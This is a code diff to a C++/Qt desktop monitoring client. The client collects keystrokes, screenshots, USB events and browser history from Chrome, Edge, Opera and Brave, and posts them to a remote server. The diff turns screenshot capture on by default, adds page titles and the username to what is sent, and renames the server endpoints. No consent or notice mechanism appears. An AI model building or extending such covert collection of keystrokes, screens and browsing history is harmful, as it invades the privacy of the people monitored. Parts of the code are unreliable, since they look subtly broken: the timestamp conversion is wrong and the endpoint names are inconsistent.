@@ -29,12 +29,13 @@
 
 #include <QtNetwork/QNetworkInterface>
 
-#include "utils/desktopinfo.h"
+// #include "utils/desktopinfo.h"
 #include "MonitorClient.h"
 #include "functions.h"
 #include "KeyboardMonitor.h"
 #include "version.h"
 #include <libudev.h>
+#include <qdatetime.h>
 
 #define TIC_INTERVAL 30
 #define HISTORY_INTERVAL 120
@@ -86,7 +87,7 @@ MonitorClient::MonitorClient()
     clientName = getClientName();
     
     // Initialize status tracking
-    screenshotEnabled = false;
+    screenshotEnabled = true;
     keylogEnabled = true;
     browserHistoryEnabled = true;
     usbMonitoringEnabled = true;
@@ -237,7 +238,7 @@ void MonitorClient::handleKeyPress(qint64 timestamp, const QString &windowTitle,
 
 int MonitorClient::getScreen()
 {
-    QString filePath = "/tmp/tmp.jpg";
+    QString filePath = "/tmp/tmp";
     int sendResult = 0;
 
     bool res;
@@ -313,7 +314,7 @@ int MonitorClient::sendScreens(QString filePath){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi___.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart imagePart;
@@ -375,26 +376,45 @@ int MonitorClient::sendTic(){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
-        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
+        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort)));
+        // QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
-        QHttpPart eventPart;
-        eventPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Event\""));
-        eventPart.setBody("Tic");
+        // QHttpPart eventPart;
+        // eventPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Event\""));
+        // eventPart.setBody("Tic");
         
-        QHttpPart versionPart;
-        versionPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Version\""));
-        versionPart.setBody(MONITORAPP_VERSION);
+        // QHttpPart versionPart;
+        // versionPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Version\""));
+        // versionPart.setBody(MONITORAPP_VERSION);
 
-        QHttpPart macAddressPart;
-        macAddressPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"MacAddress\""));
-        macAddressPart.setBody(macAddress.toUtf8());
+        // QHttpPart macAddressPart;
+        // macAddressPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"MacAddress\""));
+        // macAddressPart.setBody(macAddress.toUtf8());
 
-        multiPart->append(eventPart);
-        multiPart->append(versionPart);
-        multiPart->append(macAddressPart);
+        // multiPart->append(eventPart);
+        // multiPart->append(versionPart);
+        // multiPart->append(macAddressPart);
 
-        QNetworkReply *reply = mgr.post(req, multiPart);
+        // QNetworkReply *reply = mgr.post(req, multiPart);
+
+
+        QJsonObject pingData;
+        pingData["Event"] = "Tic";
+        pingData["Version"] = MONITORAPP_VERSION;
+        pingData["MacAddress"] = macAddress;
+        pingData["Username"] = clientName;
+        
+        QJsonDocument doc(pingData);
+        QByteArray data = doc.toJson();
+        
+        QNetworkRequest request(QUrl(QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort)));
+        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+        
+        qDebug() << "Request Content-Type:" << request.header(QNetworkRequest::ContentTypeHeader);
+        
+        QNetworkReply *reply = mgr.post(request, data);
+
+
         eventLoop.exec(); // blocks stack until "finished()" has been called
 
         if (reply->error() == QNetworkReply::NoError) {
@@ -466,11 +486,14 @@ void MonitorClient::queryBrowserHistory(const QString& dbPath, const QString& qu
             if (sqlQuery.exec(fullQuery)) {
                 while (sqlQuery.next()) {
                     qint64 visitTime = sqlQuery.value("visit_time").toLongLong();
-                    QString url = sqlQuery.value("url").toString();
-                    QString visitDate = sqlQuery.value("last_visit_time").toString();
+                    QString url = sqlQuery.value("urls.url").toString();
+                    QString title = sqlQuery.value("title").toString();
                     QJsonObject historyItem;
-                    historyItem["date"] = visitDate;
+                    historyItem["date"] = QDateTime(sqlQuery.value("visit_time")).toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
+                    historyItem["browser"] = browserName;
                     historyItem["url"] = url;
+                    historyItem["title"] = title;
+                    // historyItem["last_visit"] = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
                     browserHistories.append(historyItem);
                     if (lastCheck < visitTime) {
                         lastCheck = visitTime;
@@ -589,7 +612,7 @@ void MonitorClient::getChromeHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Chrome");
         }
@@ -602,7 +625,7 @@ void MonitorClient::getEdgeHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Edge");
         }
@@ -615,7 +638,7 @@ void MonitorClient::getOperaHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Opera");
         }
@@ -628,7 +651,7 @@ void MonitorClient::getBraveHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Brave");
         }
@@ -1036,7 +1059,7 @@ int MonitorClient::sendDataChunk(const QString& serverIP, int serverPort, const 
     QNetworkAccessManager mgr;
     QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
-    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
+    QString url = QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort);
     QNetworkRequest req;
     req.setUrl(QUrl(url));
     req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
@@ -1092,7 +1115,7 @@ bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
 {
     qDebug() << "=== Testing API Endpoints ===";
     
-    QStringList endpoints = {"/eventhandler.php", "/webapi.php"};
+    QStringList endpoints = {"/eventhandler___.php", "/webapi.php"};
     
     for (const QString& endpoint : endpoints) {
         QString url = QString("http://%1:%2%3").arg(serverIP).arg(serverPort).arg(endpoint);
@@ -1287,7 +1310,7 @@ bool MonitorClient::testServerConnection()
 {
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
-    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
+    QString url = QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort);
     
     qDebug() << "Testing server connection to:" << url;
     qDebug() << "Server IP:" << serverIP << "Port:" << serverPort;
